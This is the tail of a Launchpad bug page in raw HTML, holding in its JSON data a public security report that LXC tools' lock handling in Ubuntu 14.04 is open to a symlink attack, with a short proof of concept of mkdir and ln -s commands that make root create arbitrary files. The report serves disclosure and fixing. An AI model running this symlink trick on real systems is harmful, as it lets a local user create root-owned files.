        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1470842/+attachment/4429477/+files/0001-lxclock-use-run-lxc-lock-rather-than-run-lock-lxc.patch">0001-lxclock-use-run-lxc-lock-rather-than-run-lock-lxc.patch</a>
        <small>
          (<a href="/ubuntu/+source/lxc/+bug/1470842/+attachment/4429477">edit</a>)
        </small>
      </li>
    </ul>
    <ul>
      <li>
        <a class="sprite add" href="/ubuntu/+source/lxc/+bug/1470842/+addcomment?field.patch=on">Add patch</a>
      </li>
    </ul>
  </div>
  


      

    
          </div><!-- yui-b side -->
        
      </div><!-- yui-t4 -->

      
  <div id="footer" class="footer">
    <div class="lp-arcana">
        <div class="lp-branding">
          <a href="https://launchpad.net/"><img src="/@@/launchpad-logo-and-name-hierarchy.png" alt="Launchpad" /></a>
          &nbsp;&bull;&nbsp;
          <a href="https://launchpad.net/+tour">Take the tour</a>
          &nbsp;&bull;&nbsp;
          <a href="https://help.launchpad.net/">Read the guide</a>
          &nbsp;
          <form id="globalsearch" method="get" accept-charset="UTF-8" action="https://launchpad.net/+search">
            <input type="search" id="search-text" name="field.text" />
            <input type="image" src="/@@/search" style="vertical-align:5%" alt="Search Launchpad" />
          </form>
        </div>
        
  

    </div>

    <div class="colophon">
      &copy; 2004-2021
      <a href="http://canonical.com/">Canonical&nbsp;Ltd.</a>
      &nbsp;&bull;&nbsp;
      <a href="https://launchpad.net/legal">Terms of use</a>
      &nbsp;&bull;&nbsp;
      <a href="https://www.ubuntu.com/legal/dataprivacy">Data privacy</a>
      &nbsp;&bull;&nbsp;
      <a href="/feedback">Contact Launchpad Support</a>
      
      &nbsp;&bull;&nbsp;
      <a href="http://blog.launchpad.net/">Blog</a>
      
	&nbsp;&bull;&nbsp;
	<a href="https://canonical.com/careers">Careers</a>
      
      &nbsp;&bull;&nbsp;
      <a href="https://twitter.com/launchpadstatus">System status</a>
      <span id="lp-version">
      &nbsp;&bull;&nbsp;
        r0d8de2b
        
        
        (<a href="https://dev.launchpad.net/">Get the code!</a>)
      </span>
    </div>
  </div>

    </div><!-- yui-d0-->

    
  
  
  <script id="json-cache-script">LP.cache = {"subscribers_portlet_url_data": {"web_link": "https://bugs.launchpad.net/bugs/1470842", "self_link": "https://bugs.launchpad.net/api/devel/bugs/1470842"}, "information_type_data": {"PUBLIC": {"description": "Everyone can see this information.\n", "name": "Public", "is_private": false, "order": 0, "description_css_class": "choice-description", "value": "PUBLIC"}, "PUBLICSECURITY": {"description": "Everyone can see this security related information.\n", "name": "Public Security", "is_private": false, "order": 1, "description_css_class": "choice-description", "value": "PUBLICSECURITY"}, "USERDATA": {"description": "Only shared with users permitted to see private user information.\n", "name": "Private", "is_private": true, "order": 3, "description_css_class": "choice-description", "value": "USERDATA"}, "PRIVATESECURITY": {"description": "Only the security group can see this information.\n ", "name": "Private Security", "is_private": true, "order": 2, "description_css_class": "choice-description", "value": "PRIVATESECURITY"}}, "total_comments_and_activity": 43, "bug_is_private": false, "related_features": {}, "first visible_recent_comment": -19, "bug": {"self_link": "https://bugs.launchpad.net/api/devel/bugs/1470842", "web_link": "https://bugs.launchpad.net/bugs/1470842", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug", "id": 1470842, "private": false, "information_type": "Public Security", "name": null, "title": "lxc tools lock handling vulnerable to symlink attack", "description": "During LXC security analysis (see [1]) it was found, that when lxc tools, e.g. lxc-info, are run as user root, a symlink attack on /run/lock/lxc can be used to create arbitrary files as the root user. The malicious user has to set up the symlink attack before /run/lock/lxc/ exists, which is only possible prior to the administrator creating the first container or automatic startup starting after boot starting one.\n\nPoC:\n\n$ mkdir -p /run/lock/lxc/var/lib/lxc\n$ ln -s /test /run/lock/lxc/var/lib/lxc/somename\n$ stat /test\nstat: cannot stat \u2018/test\u2019: No such file or directory\n$ sudo lxc-create --name somename --template download # An admin would run this command\n...\nDistribution: ubuntu\nRelease: trusty\nArchitecture: amd64\n...\n$ stat /test\n\u00a0\u00a0File: \u2018/test\u2019\n\u00a0\u00a0Size: 0         \tBlocks: 0          IO Block: 4096   regular empty file\nDevice: fd01h/64769d\tInode: 52559       Links: 1\nAccess: (0600/-rw-------)  Uid: (    0/    root)   Gid: (    0/    root)\nAccess: 2015-07-02 10:40:55.703646793 -0500\nModify: 2015-07-02 10:40:55.703646793 -0500\nChange: 2015-07-02 10:40:55.703646793 -0500\n\u00a0Birth: -\n\n# lsb_release -rd\nDescription:    Ubuntu 14.04.2 LTS\nRelease:        14.04\n\n# apt-cache policy lxc\nlxc:\n\u00a0\u00a0Installed: 1.0.7-0ubuntu0.1\n\u00a0\u00a0Candidate: 1.0.7-0ubuntu0.1\n\u00a0\u00a0Version table:\n\u00a0*** 1.0.7-0ubuntu0.1 0\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0500 http://archivexxx/ubuntu/ trusty-updates/main amd64 Packages\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0100 /var/lib/dpkg/status\n\u00a0\u00a0\u00a0\u00a0\u00a01.0.3-0ubuntu3 0\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0500 http://archivexxx/ubuntu/ trusty/main amd64 Packages\n\n[1] https://service.ait.ac.at/security/2015/LxcSecurityAnalysis.html", "owner_link": "https://bugs.launchpad.net/api/devel/~roman-fiedler-deactivatedaccount", "bug_tasks_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1470842/bug_tasks", "duplicate_of_link": null, "date_created": "2015-07-02T12:46:33.491657+00:00", "activity_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1470842/activity", "subscriptions_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1470842/subscriptions", "date_last_updated": "2015-07-22T19:24:44.583137+00:00", "who_made_private_link": null, "date_made_private": null, "heat": 262, "bug_watches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1470842/bug_watches", "cves_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1470842/cves", "duplicates_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1470842/duplicates", "attachments_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1470842/attachments", "security_related": true, "latest_patch_uploaded": "2015-07-15T15:58:34.881605+00:00", "tags": [], "date_last_message": "2015-07-22T19:23:33.598743+00:00", "number_of_duplicates": 0, "message_count": 22, "users_affected_count": 1, "users_unaffected_count": 0, "users_affected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1470842/users_affected", "users_unaffected_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1470842/users_unaffected", "users_affected_count_with_dupes": 1, "other_users_affected_count_with_dupes": 1, "users_affected_with_dupes_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1470842/users_affected_with_dupes", "messages_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1470842/messages", "linked_branches_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1470842/linked_branches", "linked_merge_proposals_collection_link": "https://bugs.launchpad.net/api/devel/bugs/1470842/linked_merge_proposals", "http_etag": "\"718cce57ed627ab03f59302d5788de62299f3755-29a28da130fd264f105c5fa85b9a0db960e005d6\""}, "bugtask_data": {"1868490": {"assignee_vocabulary": "AllUserTeamsParticipation", "user_can_unassign": false, "bugtask_path": "/ubuntu/+source/lxc/+bug/1470842", "assignee_value": null, "user_can_edit_status": true, "bug_title": "lxc tools lock handling vulnerable to symlink attack", "user_can_edit_milestone": false, "prefix": "ubuntu_lxc", "form_row_id": "task1868490", "target_is_product": false, "user_can_edit_importance": false, "assignee_is_team": null, "delete_link": "https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1470842/+delete", "user_can_edit_assignee": false, "milestone_widget_items": "[]", "status_widget_items": "[]", "status_value": "Fix Released", "importance_value": "Undecided", "hide_assignee_team_selection": true, "user_can_delete": false, "row_id": "tasksummary1868490", "assignee_vocabulary_filters": [], "targetname": "lxc (Ubuntu)", "importance_widget_items": "[]", "milestone_value": null, "id": 1868490}}, "context": {"self_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/lxc/+bug/1470842", "web_link": "https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1470842", "resource_type_link": "https://bugs.launchpad.net/api/devel/#bug_task", "bug_link": "https://bugs.launchpad.net/api/devel/bugs/1470842", "milestone_link": null, "status": "Fix Released", "importance": "Undecided", "assignee_link": null, "bug_target_display_name": "lxc (Ubuntu)", "bug_target_name": "lxc (Ubuntu)", "bug_watch_link": null, "date_assigned": null, "date_created": "2015-07-02T12:46:33.491657+00:00", "date_confirmed": "2015-07-02T15:35:52.163764+00:00", "date_incomplete": null, "date_in_progress": "2015-07-22T14:12:27.789092+00:00", "date_closed": "2015-07-22T14:12:27.789092+00:00", "date_left_new": "2015-07-02T15:30:43.375801+00:00", "date_triaged": "2015-07-22T14:12:27.789092+00:00", "date_fix_committed": "2015-07-22T14:12:27.789092+00:00", "date_fix_released": "2015-07-22T14:12:27.789092+00:00", "date_left_closed": null, "owner_link": "https://bugs.launchpad.net/api/devel/~roman-fiedler-deactivatedaccount", "target_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/lxc", "title": "Bug #1470842 in lxc (Ubuntu): \"lxc tools lock handling vulnerable to symlink attack\"", "related_tasks_collection_link": "https://bugs.launchpad.net/api/devel/ubuntu/+source/lxc/+bug/1470842/related_tasks", "is_complete": true, "http_etag": "\"4076d8edd8955506a0279c1a05dfa9a96d5f1eaf-23b62d0fedbf67366423e39e0d8a4ed1195bc9fd\""}, "initial_comment_batch_offset": 41};</script>

    
  

    
  </body>


  <!--
    Facet name: bugs
    Page type: main_side
    Has global search: True
    Has application tabs: True
    Has side portlets: True

    At least 62 queries/external actions issued in 0.72 seconds

    Features: {'app.maintenance_message': None, 'visible_render_time': None, 'bugs.affected_count_includes_dupes.disabled': None, 'app.mainsite_only.canonical_url': None, 'disclosure.dsp_picker.enabled': 'on', 'bugs.nominations.bug_supervisors_can_target': 'on', 'baselayout.careers_link.disabled': None, 'hard_timeout': '9000', 'js.yui_version': None, 'profiling.enabled': None}

    r0d8de2b

    -->

</html>

